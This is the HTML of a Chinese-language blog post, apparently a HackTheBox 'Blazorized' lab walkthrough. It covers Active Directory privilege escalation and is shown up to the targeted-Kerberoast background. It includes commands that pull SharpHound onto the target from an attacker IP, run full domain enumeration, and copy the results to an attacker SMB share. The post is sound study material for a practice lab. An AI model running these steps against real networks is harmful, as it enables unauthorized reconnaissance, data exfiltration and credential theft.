@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="简述本文是Hard难度的HTB Blazorized机器的域渗透部分，其中   等域渗透提权细节是此box的特色，主要参考0xdf’s blog Blazorized walkthrough记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Blazorized []">
+<meta property="og:url" content="https://fdlucifer.github.io/2024/11/10/blazorized/index.html">
+<meta property="og:site_name" content="0xfd&#39;s blog">
+<meta property="og:description" content="简述本文是Hard难度的HTB Blazorized机器的域渗透部分，其中   等域渗透提权细节是此box的特色，主要参考0xdf’s blog Blazorized walkthrough记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized9.png">
+<meta property="article:published_time" content="2024-11-09T18:08:29.000Z">
+<meta property="article:modified_time" content="2024-11-09T19:33:11.935Z">
+<meta property="article:author" content="253">
+<meta property="article:tag" content="DC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2024/11/10/blazorized/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2024/11/10/blazorized/","path":"2024/11/10/blazorized/","title":"HackTheBox Blazorized []"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox Blazorized [] | 0xfd's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="0xfd's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">0xfd's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by 0xfd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">75</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">216</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E9%83%A8%E5%88%86"><span class="nav-number">2.</span> <span class="nav-text">域渗透部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bloodhound%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">bloodhound分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEbloodhound"><span class="nav-number">2.1.1.</span> <span class="nav-text">安装配置bloodhound</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Collection"><span class="nav-number">2.1.2.</span> <span class="nav-text">Collection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.3.</span> <span class="nav-text">加载数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.1.4.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Targeted-Kerberoast"><span class="nav-number">2.2.</span> <span class="nav-text">Targeted Kerberoast</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">2.2.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">2.2.2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3hash"><span class="nav-number">2.2.3.</span> <span class="nav-text">破解hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">2.3.</span> <span class="nav-text">shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E5%AF%86%E7%A0%81"><span class="nav-number">2.3.1.</span> <span class="nav-text">验证密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Evil-WinRM"><span class="nav-number">2.3.2.</span> <span class="nav-text">Evil-WinRM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell-as-SSA-6010"><span class="nav-number">2.4.</span> <span class="nav-text">Shell as SSA_6010</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Groups"><span class="nav-number">2.4.1.</span> <span class="nav-text">Groups</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95"><span class="nav-number">2.4.2.</span> <span class="nav-text">可写目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Users"><span class="nav-number">2.4.3.</span> <span class="nav-text">Users</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logon-Script"><span class="nav-number">2.4.4.</span> <span class="nav-text">Logon Script</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execution"><span class="nav-number">2.5.</span> <span class="nav-text">Execution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Strategy"><span class="nav-number">2.5.1.</span> <span class="nav-text">Strategy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload"><span class="nav-number">2.5.2.</span> <span class="nav-text">Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.5.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell-as-administrator"><span class="nav-number">2.6.</span> <span class="nav-text">Shell as administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.6.1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash-Dump"><span class="nav-number">2.6.2.</span> <span class="nav-text">Hash Dump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-1"><span class="nav-number">2.6.3.</span> <span class="nav-text">shell</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="253"
+      src="/images/blackhole.png">
+  <p class="site-author-name" itemprop="name">253</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">216</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2024/11/10/blazorized/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blackhole.png">
+      <meta itemprop="name" content="253">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xfd's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HackTheBox Blazorized [] | 0xfd's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox Blazorized []
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-11-10 02:08:29 / Modified: 03:33:11" itemprop="dateCreated datePublished" datetime="2024-11-10T02:08:29+08:00">2024-11-10</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.1k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>11 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是Hard难度的HTB Blazorized机器的域渗透部分，其中   等域渗透提权细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDI0LzExLzA5L2h0Yi1ibGF6b3JpemVkLmh0bWw=">0xdf’s blog Blazorized walkthrough<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized.png"></li>
+</ul>
+<span id="more"></span>
+
+<h1 id="域渗透部分"><a href="#域渗透部分" class="headerlink" title="域渗透部分"></a>域渗透部分</h1><h2 id="bloodhound分析"><a href="#bloodhound分析" class="headerlink" title="bloodhound分析"></a>bloodhound分析</h2><h3 id="安装配置bloodhound"><a href="#安装配置bloodhound" class="headerlink" title="安装配置bloodhound"></a>安装配置bloodhound</h3><p>使用的是较新的Bloodhound-CE，它作为Docker容器运行得非常好。在docker compose中使用curl命令设置它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up</span><br></pre></td></tr></table></figure>
+
+<p>这是<span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0LmJsb29kaG91bmRlbnRlcnByaXNlLmlvL2hjL2VuLXVzL2FydGljbGVzLzE3NDY4NDUwMDU4MjY3LUluc3RhbGwtQmxvb2RIb3VuZC1Db21tdW5pdHktRWRpdGlvbi13aXRoLURvY2tlci1Db21wb3Nl">文档<i class="fa fa-external-link-alt"></i></span>中相同的命令，只是添加了BLOODHOUND_PORT&#x3D;8888，因为默认情况下它想在8080上运行web服务器，已经有Burp侦听。</p>
+<p>在输出大约50行之后，它会打印出一个随机的临时密码：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized1.png"></li>
+</ul>
+<p>访问localhost:8888，它将显示一个Bloodhound登录屏幕。以用户名admin和给定的密码登录，并在提示时更新。</p>
+<p>在下一个窗口中，它显示这个数据库中没有数据（这是预期的，因为还没有收集任何数据）：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized2.png"></li>
+</ul>
+<p>右上方的齿轮图标提供了一个菜单，其中包括”Download Collectors”：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized3.png"></li>
+</ul>
+<p>该页面有SharpHound二进制文件可供下载，下载、解压缩并使用Python web服务器托管SharpHound.exe。</p>
+<h3 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h3><p>只有一个shell，box没有creds，需要用Blazorized上运行的东西来收集bloodhound的数据。已经从上面得到了SharpHound.exe，把它上传到Blazorized并运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; wget http://10.10.14.6/SharpHound.exe -outfile SharpHound.exe</span><br><span class="line">PS C:\programdata&gt; .\SharpHound.exe -c all</span><br><span class="line">2024-11-01T06:09:19.7721017-05:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound</span><br><span class="line">2024-11-01T06:09:20.0220952-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices</span><br><span class="line">2024-11-01T06:09:20.0689718-05:00|INFORMATION|Initializing SharpHound at 6:09 AM on 11/1/2024</span><br><span class="line">2024-11-01T06:09:20.1158490-05:00|INFORMATION|Resolved current domain to blazorized.htb</span><br><span class="line">2024-11-01T06:09:20.2564704-05:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices</span><br><span class="line">2024-11-01T06:09:20.3970940-05:00|INFORMATION|Beginning LDAP search <span class="keyword">for</span> blazorized.htb</span><br><span class="line">2024-11-01T06:09:20.5064724-05:00|INFORMATION|Beginning LDAP search <span class="keyword">for</span> blazorized.htb Configuration NC</span><br><span class="line">2024-11-01T06:09:20.5377221-05:00|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line">2024-11-01T06:09:20.5377221-05:00|INFORMATION|LDAP channel closed, waiting <span class="keyword">for</span> consumers</span><br><span class="line">2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache <span class="keyword">for</span> BLAZORIZED.HTB</span><br><span class="line">2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache <span class="keyword">for</span> BLAZORIZED.HTB</span><br><span class="line">2024-11-01T06:09:20.9283450-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache <span class="keyword">for</span> BLAZORIZED.HTB</span><br><span class="line">2024-11-01T06:09:21.4908447-05:00|INFORMATION|Consumers finished, closing output channel</span><br><span class="line">Closing writers</span><br><span class="line">2024-11-01T06:09:21.5220984-05:00|INFORMATION|Output channel closed, waiting <span class="keyword">for</span> output task to complete</span><br><span class="line">2024-11-01T06:09:21.6627215-05:00|INFORMATION|Status: 313 objects finished (+313 313)/s -- Using 37 MB RAM</span><br><span class="line">2024-11-01T06:09:21.6627215-05:00|INFORMATION|Enumeration finished <span class="keyword">in</span> 00:00:01.2861155</span><br><span class="line">2024-11-01T06:09:21.7877405-05:00|INFORMATION|Saving cache with stats: 20 ID to <span class="built_in">type</span> mappings.</span><br><span class="line"> 2 name to SID mappings.</span><br><span class="line"> 1 machine sid mappings.</span><br><span class="line"> 4 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2024-11-01T06:09:21.8346081-05:00|INFORMATION|SharpHound Enumeration Completed at 6:09 AM on 11/1/2024! Happy Graphing!</span><br></pre></td></tr></table></figure>
+
+<p>在主机上启动smbserver.py，创建一个名为share的共享：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fdluci@hacky$ smbserver.py share . -smb2support -username fdluci -password fdluci</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>
+
+<p>从Blazorized连接到共享并拷贝zip文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; net use \\10.10.14.6 /u:fdluci fdluci</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\programdata&gt; copy *.zip \\10.10.14.6\share\</span><br></pre></td></tr></table></figure>
+
+<h3 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h3><p>回到Bloodhound网页，在齿轮图标下，点击”Administration”进入”File Ingest”页面。点击”Upload File(s)”，把存档文件给它。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized4.png"></li>
+</ul>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>点击”Explore”进入Bloodhound窗口。首先找到拥有的用户nu_1055，并将它们标记为已拥有。首先看到的是”Outbound Object Control”：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized5.png"></li>
+</ul>
+<p>点击它将RSA_4810添加到界面中：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized6.png"></li>
+</ul>
+<p>nu_1055已经通过RSA_4810用户WriteSPN。</p>
+<h2 id="Targeted-Kerberoast"><a href="#Targeted-Kerberoast" class="headerlink" title="Targeted Kerberoast"></a>Targeted Kerberoast</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>服务主体名称（Service Principal Name，SPN）是一个唯一标识符，它将服务实例与Kerberos中的服务帐户关联起来。</p>
+<p>Kerberoasting是一种攻击，通过身份验证的用户通过服务的SPN请求服务票证，返回的票证使用与该服务关联的用户的密码进行加密。如果该密码很弱，则可以通过离线暴力破解破解。</p>
+<p>为了执行有针对性的kerberoast，为RSA_4810帐户分配一个SPN。然后可以申请一张ticket作为假服务，并获得一张用RSA_4810的密码加密的票来破解。</p>
+<p>当点击WriteSPN时，在Bloodhound右侧面板的”Windows Abuse”部分给出了从Windows执行此攻击的完整过程：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized7.png"></li>
+</ul>
